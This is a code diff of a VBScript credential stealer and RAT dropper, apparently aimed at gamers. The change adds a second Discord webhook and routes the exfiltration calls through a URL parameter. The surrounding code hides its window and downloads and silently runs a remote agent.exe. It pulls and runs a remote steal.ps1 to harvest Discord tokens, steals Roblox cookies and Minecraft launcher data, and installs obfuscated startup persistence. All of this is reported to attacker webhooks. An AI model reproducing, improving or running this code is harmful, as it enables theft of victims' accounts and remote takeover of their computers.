@@ -5,12 +5,13 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, PC, USER
+Dim sh, fso, WH, WH_REG, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOK ---
-WH = "https://discord.com/api/webhooks/1562254751888842823/3bZLLkNvHLfxcy6UZZ-Tm5wdAgHt7xw8GL70VNzJ8RSmZAZq_-QRSVSAyiMJ1pDrLJyB"
+' --- WEBHOOKS ---
+WH = "https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
+WH_REG = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -24,14 +25,14 @@ Call Persistence
 
 Dim downloadAttempt
 For downloadAttempt = 1 To 2
-    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003)
+    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003, WH)
     Call DropRAT
     If downloadAttempt < 2 Then Call SleepMinutes(2)
 Next
 
 Dim runCount
 For runCount = 1 To 4
-    Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003)
+    Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REG)
     Call GrabTokens
     Call IP
     Call GrabRoblox
@@ -55,7 +56,7 @@ Sub IP()
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbed(":dart: Target", info, 3447003)
+    Call PostEmbed(":dart: Target", info, 3447003, WH)
     Set xh = Nothing
 End Sub
 
@@ -116,7 +117,7 @@ Sub GrabRoblox()
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
 
-    PostEmbed "Roblox Cookie", "PC: " & PC & " | User: " & USER & vbCrLf & "**Cookie:**" & vbCrLf & "```" & cookie & "```", 65280
+    PostEmbed "Roblox Cookie", "PC: " & PC & " | User: " & USER & vbCrLf & "**Cookie:**" & vbCrLf & "```" & cookie & "```", 65280, WH
 End Sub
 
 Sub GrabMinecraft()
@@ -126,7 +127,7 @@ Sub GrabMinecraft()
     If fso.FileExists(launcherPath) Then
         Dim raw : raw = ReadFile(launcherPath)
         If Len(raw) > 10 Then
-            Call PostEmbed(":pick: Minecraft Accounts", "PC: " & PC & " | User: " & USER & vbCrLf & "**Launcher Data:**" & vbCrLf & "```json" & vbCrLf & raw & vbCrLf & "```", 3447003)
+            Call PostEmbed(":pick: Minecraft Accounts", "PC: " & PC & " | User: " & USER & vbCrLf & "**Launcher Data:**" & vbCrLf & "```json" & vbCrLf & raw & vbCrLf & "```", 3447003, WH)
             found = True
         End If
     End If
@@ -135,7 +136,7 @@ Sub GrabMinecraft()
     If Not found And fso.FileExists(oldLauncher) Then
         Dim rawOld : rawOld = ReadFile(oldLauncher)
         If Len(rawOld) > 10 Then
-            Call PostEmbed(":pick: Minecraft Profiles", "PC: " & PC & " | User: " & USER & vbCrLf & "**Profile Data:**" & vbCrLf & "```json" & vbCrLf & rawOld & vbCrLf & "```", 3447003)
+            Call PostEmbed(":pick: Minecraft Profiles", "PC: " & PC & " | User: " & USER & vbCrLf & "**Profile Data:**" & vbCrLf & "```json" & vbCrLf & rawOld & vbCrLf & "```", 3447003, WH)
         End If
     End If
 End Sub
@@ -157,7 +158,6 @@ Sub GrabFroststrap()
 End Sub
 
 Sub DropRAT()
-    ' REPLACE THIS WITH YOUR GITHUB RELEASE LINK
     Dim dl : dl = "https://github.com/lozix94-afk/lozixloggedurmom/releases/download/v1/agent.exe"
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
@@ -173,12 +173,12 @@ Sub DropRAT()
 
     If rDone Then
         Dim dsize : dsize = fso.GetFile(op).Size
-        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
+        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003, WH)
         sh.Run op, 0, False
-        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
+        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280, WH)
     Else
         sh.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
-        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680)
+        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680, WH)
     End If
 End Sub
 
@@ -194,13 +194,12 @@ Sub Persistence()
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
 
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
+    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280, WH)
 End Sub
 
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    ' REPLACE THIS WITH YOUR RAW GITHUB LINK
     xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/lozixloggedurmom/main/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
@@ -231,7 +230,7 @@ Sub GrabTokens()
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:**" & vbCrLf & "```" & p(4) & "```"
-                        Call PostEmbed(":gift: Discord Token", info, 5793266)
+                        Call PostEmbed(":gift: Discord Token", info, 5793266, WH)
                     End If
                 End If
             End If
@@ -243,24 +242,24 @@ Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & 
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-Sub PostEmbed(t, d, c)
+Sub PostEmbed(t, d, c, url)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
-    h.Open "POST", WH, False
+    h.Open "POST", url, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
 End Sub
 
-Sub PostFile(fn, ct)
+Sub PostFile(fn, ct, url)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
     Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
-    h.Open "POST", WH, False
+    h.Open "POST", url, False
     h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
@@ -278,7 +277,7 @@ Sub RunCmd(cmd)
     Dim startTime: startTime = Timer()
     Do While r
         If Timer() - startTime > 60 Then
-            Call PostEmbed("DEBUG", "PS1 TIMEOUT after 60s, killing", 16711680)
+            Call PostEmbed("DEBUG", "PS1 TIMEOUT after 60s, killing", 16711680, WH)
             sh.Run "taskkill /F /PID " & i, 0, False
             Exit Do
         End If
